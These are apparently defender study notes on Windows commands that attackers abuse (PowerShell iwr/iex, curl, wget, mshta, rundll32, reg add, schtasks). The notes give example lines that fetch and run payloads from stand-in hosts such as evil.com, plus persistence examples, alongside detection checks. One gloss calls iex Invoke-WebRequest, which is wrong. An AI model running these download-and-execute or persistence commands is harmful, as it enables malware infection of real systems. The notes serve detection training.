Most Important commands to Memorize:
powershell -  Windows Powerful scripting shell
Why Attackers use it:
  Attackers use to download Malware
  Runs scripts in Memory (Fileless Attack)
  Bypass AV

cmd - Basic Windows command prompt
Why Attackers use it:
  LAunch other tools
  Chain commands
  Execute payloads

iwr - Invoke-WebRequest (Powershell command to download from Internet)
Why Attackers use it:
  Download Payload silently
  Eg: iwr http://malicious.com/payload.exe
Checks:
  External URL
  Suspicious domain
  Download location

curl - is a tool to transfer data from URL
Why Attackers use it:
  Download Malware
  Eg: curl http://evil.com/file.exe -o file.exe
Check:
External IP
Newly registered domain
Suspicious file type

wget - Another download tool (similar to curl) - download from internet
Why Attackers Use it:
Eg: wget http://attacker.com/backdoor.exe
Pull payload from server

iex - Invoke-WebRequest - Executes command as code.
Run downloaded script directly in memory (fileless attack)
iex (iwr http://evil.com/script.ps1)
Check:
Very suspicious combination:
  iwr + iex
  download + execute

Start-Process - Launch another program
  Run Payload quietly
  Eg: Start-Process malware.exe

reg add - Adds registry key. [ Persistence-Run Malware at startup ]
  Eg: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run

schtasks - create scheduled task.
        Run Malware every hr / on reboot
    Eg: schtasks /create /sc minute /mo 30

mshta - Runs HTA (HTML APplication)
    Executes Remote script
    Eg: mshta http://evil.com/payload.hta

rundll32 - Runs DLL File.
  Executes Malicious DLL Files.
  Eg: rundll32 malware.dll,EntryPoint
Check:
  DLL path
  User temp folder
  Downloads folder

Dangerous Combo:
powershell + iwr + iex
cmd + powershell
mshta + URL
rundll32 + temp folder DLL
schtasks + persistence
reg add + run key



























